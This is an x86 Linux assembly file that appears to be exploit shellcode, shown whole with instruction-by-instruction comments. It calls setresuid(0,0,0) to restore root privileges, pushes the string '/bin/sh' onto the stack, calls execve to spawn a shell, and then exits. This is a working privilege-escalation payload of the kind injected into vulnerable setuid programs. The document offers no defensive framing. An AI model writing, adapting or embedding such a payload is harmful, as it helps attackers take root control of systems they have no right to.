global _start

section .text
 
_start:
       
    ; setresuid(0,0,0) 
    mov al,0xa4 ; Syscall # for setresuid()_
    xor ebx,ebx ; ebx = 0x0
    xor ecx,ecx ; ecx = 0x0
    xor edx,edx ; edx = 0x0
    int 0x80    ; Calls kernel

    ; execve('/bin/sh',
    xor eax,eax ; Zeroes eax 
    push eax    ; Push NULL terminator into the stack
    push 0x68732f2f ; Push //sh into the stack
    push 0x6e69622f ; Push /bin into the stack
    mov ebx,esp     ; ebx = '/bin/sh'
    
    push eax    ; Push NULL terminator into the stack
    mov edx,esp ; edx = 0x0

    push ebx    ; Push address pointing to "/bin/sh" to the stack
    mov ecx,esp ; ecx contains address that points to "/bin/sh"
    mov al,0xb  ; Syscall # for execve()
    int 0x80    ; Calls kernel

    xor eax,eax ; Zeroes eax
    xor ebx,ebx ; Zeroes ebx, exit code for exit()
    inc eax     ; Syscall # for exit() : 1
    int 0x80    ; Calls kernel
